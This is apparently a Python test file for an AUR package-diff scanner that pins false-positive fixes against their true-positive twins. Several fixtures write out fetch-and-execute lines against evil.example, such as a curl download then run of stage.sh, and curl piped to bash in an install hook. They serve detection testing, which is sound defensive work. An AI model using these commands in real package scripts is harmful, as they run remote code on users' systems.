"""Malign false positives from the 2026-10-28 watcher window.

Each case pins the benign shape the rule fired on and the true-positive twin
the fix must keep.  Benign false positives (real bad practices) are not here:
those are packager/suppression work, not rule changes.
"""

from __future__ import annotations

import sys
from pathlib import Path

_ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(_ROOT / "scripts"))
sys.path.insert(0, str(_ROOT))

from calibration_gates import shipped_config  # noqa: E402

from trustsight.analysis import scan_diff  # noqa: E402
from trustsight.buckets import classify_urls  # noqa: E402
from trustsight.config import load_config, load_rules  # noqa: E402
from trustsight.expansion import resolve_text  # noqa: E402
from trustsight.full_aur._pipeline_helpers import _is_routine_bump  # noqa: E402


def _entries(diff, current_text=None):
    with shipped_config():
        fact = scan_diff(diff, rules=load_rules(), config=load_config(),
                         package_name="p", current_text=current_text)
    return fact.score_breakdown


def _ids(diff, current_text=None):
    return {e.rule_id for e in _entries(diff, current_text)}


# --- W1: a release-digest lookup is not a payload fetch --------------------

_NEO_DIFF = (
    "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,12 @@\n"
    " pkgname=p\n"
    " pkgver=1\n"
    " pkgrel=1\n"
    ' source=("nvim-linux-x86_64.tar.gz::https://github.com/neovim/neovim/'
    'releases/download/nightly/nvim-linux-x86_64.tar.gz")\n'
    "+prepare() {\n"
    "+  digest=$(curl -s "
    '"https://api.github.com/repos/neovim/neovim/releases/tags/nightly"'
    " | jq -r .assets[].digest | awk '{print}')\n"
    "+}\n"
    "+check() {\n"
    "+  ./bin/nvim --version\n"
    "+}\n"
)


def test_h082_digest_lookup_is_not_fetch_then_execute():
    assert "H082" not in _ids(_NEO_DIFF)


def test_h016_digest_lookup_is_not_a_hidden_build_fetch():
    assert "H016" not in _ids(_NEO_DIFF)


def test_h082_named_output_still_fires():
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,6 @@\n"
        " pkgname=p\n"
        "+prepare() {\n"
        "+  curl -o stage.sh https://evil.example/stage.sh\n"
        "+  ./stage.sh\n"
        "+}\n"
    )
    assert "H082" in _ids(diff)


def test_h016_a_written_api_response_still_fires():
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,5 @@\n"
        " pkgname=p\n"
        "+prepare() {\n"
        "+  curl -o meta.json https://api.evil.example/releases\n"
        "+}\n"
    )
    assert "H016" in _ids(diff)


def test_r010_printed_curl_is_not_scored():
    diff = (
        "--- a/demo.install\n+++ b/demo.install\n@@ -1,2 +1,5 @@\n"
        " post_install() {\n"
        '+  echo "::   sh -c \\"\\$(curl -fsSL https://evil.example/x)\\"'
        '"\n'
        " }\n"
    )
    assert "R010" not in _ids(diff, "pkgname=p\npkgver=1\ninstall=demo.install\n")


# --- W2: an escaped substitution inside a quoted echo is printed text ------

_VISOR_INSTALL = (
    "--- a/demo.install\n+++ b/demo.install\n@@ -1,2 +1,5 @@\n"
    " post_install() {\n"
    '+  echo "::   sh -c \\"\\$(curl -fsSL https://evil.example/get.sh)\\"'
    '"\n'
    " }\n"
)
_VISOR_CURRENT = "pkgname=p\npkgver=1\ninstall=demo.install\n"


def test_h017_escaped_substitution_in_echo_is_printed_text():
    assert "H017" not in _ids(_VISOR_INSTALL, _VISOR_CURRENT)


def test_h017_unescaped_substitution_still_fires():
    diff = (
        "--- a/demo.install\n+++ b/demo.install\n@@ -1,2 +1,5 @@\n"
        " post_install() {\n"
        '+  echo "$(curl -fsSL https://evil.example/get.sh | bash)"\n'
        " }\n"
    )
    assert "H017" in _ids(diff, _VISOR_CURRENT)


# --- W3: the package's own installed binary is not a payload ---------------

def test_h072_own_pkgdir_binary_is_not_a_payload():
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,7 @@\n"
        " pkgname=p\n"
        "+package() {\n"
        '+  install -Dm755 "$srcdir/p-1.1" "$pkgdir/usr/bin/demo"\n'
        '+  "$pkgdir/usr/bin/demo" man > /dev/null\n'
        "+}\n"
    )
    assert "H072" not in _ids(diff)


def test_h072_written_srcdir_script_still_fires():
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,7 @@\n"
        " pkgname=p\n"
        "+build() {\n"
        '+  install -Dm755 "$srcdir/x" "$srcdir/stage.sh"\n'
        '+  "$srcdir/stage.sh"\n'
        "+}\n"
    )
    assert "H072" in _ids(diff)


# --- W4: a case label is not a command ------------------------------------

def test_x002_version_case_label_is_not_a_command():
    diff = (
        "--- a/demo.install\n+++ b/demo.install\n@@ -1,3 +1,9 @@\n"
        " post_upgrade() {\n"
        '+  case "$1" in\n'
        "+    0.*|1.*)\n"
        "+      echo old\n"
        "+      ;;\n"
        "+  esac\n"
        " }\n"
    )
    assert "X002" not in _ids(diff, _VISOR_CURRENT)


def test_x002_variable_command_still_fires():
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,5 @@\n"
        " pkgname=p\n"
        "+build() {\n"
        '+  "$cmd" --version\n'
        "+}\n"
    )
    assert "X002" in _ids(diff)


# --- W5: git provenance is not a sensitive indirect assignment ------------

def test_x024_git_provenance_is_not_sensitive():
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,6 @@\n"
        " pkgname=p\n"
        "+prepare() {\n"
        '+  local path=$(git config --file .gitmodules '
        '"submodule.$name.path")\n'
        '+  echo "$path"\n'
        "+}\n"
    )
    assert "X024" not in _ids(diff)


def test_x024_path_from_a_fetch_still_fires():
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,5 @@\n"
        " pkgname=p\n"
        "+build() {\n"
        "+  PATH=$(curl -fsSL https://evil.example/bin)\n"
        "+}\n"
    )
    assert "X024" in _ids(diff)


def test_w001_says_the_recipe_could_not_read_it():
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,5 @@\n"
        " pkgname=p\n"
        "+build() {\n"
        "+  bash build/verify-submodules.sh\n"
        "+}\n"
    )
    reasons = [e.reason for e in _entries(diff) if e.rule_id == "W001"]
    assert reasons and "readable from the AUR recipe" in reasons[0]


# --- W6: vendor release hosts ---------------------------------------------

def test_vendor_release_hosts_are_official():
    urls = [
        "https://repo.secureblue.dev/Packages/x.rpm",
        "https://repo.yandex.ru/yandex-browser/x.deb",
        "https://nebula.gg/downloads/x.deb",
        "https://downloads.sejda-cdn.com/x.deb",
    ]
    with shipped_config():
        buckets = classify_urls(urls)
    assert buckets == {url: "official" for url in urls}


def test_unknown_host_is_still_unknown():
    with shipped_config():
        buckets = classify_urls(["https://evil.example/x.rpm"])
    assert buckets == {"https://evil.example/x.rpm": "unknown"}


def _binary_bump(host):
    return (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,4 @@\n"
        " pkgname=p\n"
        "-pkgver=1.0\n"
        "+pkgver=1.1\n"
        "-source=(\"https://%s/x-1.0.rpm\")\n"
        "+source=(\"https://%s/x-1.1.rpm\")\n"
        "-sha256sums=('" + "a" * 64 + "')\n"
        "+sha256sums=('" + "b" * 64 + "')\n"
    ) % (host, host)


def test_vendor_binary_bump_is_quiet():
    ids = _ids(_binary_bump("repo.secureblue.dev"))
    assert "C005" not in ids and "SOURCE_BUCKET" not in ids


def test_unknown_binary_host_still_fires():
    ids = _ids(_binary_bump("evil.example"))
    assert "C005" in ids and "SOURCE_BUCKET" in ids


# --- W7: an unresolved substitution is not an empty token -----------------

def test_unset_substitution_stays_unresolved():
    resolved = resolve_text(
        "nvim-linux-${_arch}.tar.gz", {"_arch": "${CARCH/aarch64/arm64}"})
    assert "nvim-linux-.tar.gz" not in resolved
    assert "${" in resolved


# --- W8: routine bumps ----------------------------------------------------

def test_routine_bump_is_version_and_checksums_only():
    old = "pkgname=p\npkgver=1.0\npkgrel=1\nsha256sums=('" + "a" * 64 + "')\n"
    new = "pkgname=p\npkgver=1.1\npkgrel=1\nsha256sums=('" + "b" * 64 + "')\n"
    assert _is_routine_bump(old, new) is True


def test_a_new_source_is_not_routine():
    old = "pkgname=p\npkgver=1.0\nsource=(\"https://a/x.tar.gz\")\n"
    new = old.replace("pkgver=1.0", "pkgver=1.1").replace(
        '"https://a/x.tar.gz"', '"https://a/x.tar.gz"\n"0001.patch"')
    assert _is_routine_bump(old, new) is False


def test_a_removed_checksum_is_not_routine():
    old = "pkgname=p\npkgver=1.0\nsha256sums=('" + "a" * 64 + "'\n            '" + "b" * 64 + "')\n"
    new = "pkgname=p\npkgver=1.1\nsha256sums=('" + "a" * 64 + "')\n"
    assert _is_routine_bump(old, new) is False


# --- LOCK: shapes already fixed at HEAD -----------------------------------

def test_c004_local_patch_removal_with_a_variable_version_is_quiet():
    new = (
        "pkgname=p\n_ver=153.6.0esr\npkgver=\"${_ver}\"\n"
        "source=(\"https://example.com/ff.tar.gz\")\n"
        "sha256sums=('" + "c" * 64 + "')\n"
    )
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,7 +1,5 @@\n"
        " pkgname=p\n"
        "-_ver=140.17.0esr\n"
        "+_ver=153.6.0esr\n"
        " pkgver=\"${_ver}\"\n"
        "-source=(\"https://example.com/ff.tar.gz\"\n"
        "-        \"0001-a.patch\")\n"
        "-sha256sums=('" + "a" * 64 + "'\n"
        "-            '" + "b" * 64 + "')\n"
        "+source=(\"https://example.com/ff.tar.gz\")\n"
        "+sha256sums=('" + "c" * 64 + "')\n"
    )
    assert "C004" not in _ids(diff, new)
